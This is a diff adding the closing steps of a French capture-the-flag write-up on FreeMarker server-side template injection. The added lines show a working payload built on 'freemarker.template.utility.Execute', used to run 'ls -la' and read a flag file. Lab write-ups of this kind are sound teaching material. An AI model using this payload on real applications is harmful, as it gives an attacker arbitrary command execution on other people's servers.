@@ -84,4 +84,25 @@ Ici, je vais tester le premier payload pour voir si l'id nous est retourné.
 
 ![](../img/Pasted%20image%2020261015203339.png)
 
-On peut voir comme quoi l'id est bel et bien retourner, on va donc pouvoir 
+On peut voir que l'id est bel et bien retourné, on va donc pouvoir exécuter du code arbitraire. 
+
+Ici, je vais maintenant lister les fichiers : 
+
+```java
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("ls -la")}
+```
+
+![](../img/Pasted%20image%2020261015203453.png)
+
+Bingo! 
+
+Maintenant il suffit de faire : 
+
+```java
+<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("cat SECRET_FLAG.txt")}
+```
+
+
+![](../img/Pasted%20image%2020261015203550.png)
+
+BINGO ! on se retrouve bientôt pour un nouveau challenge ! 
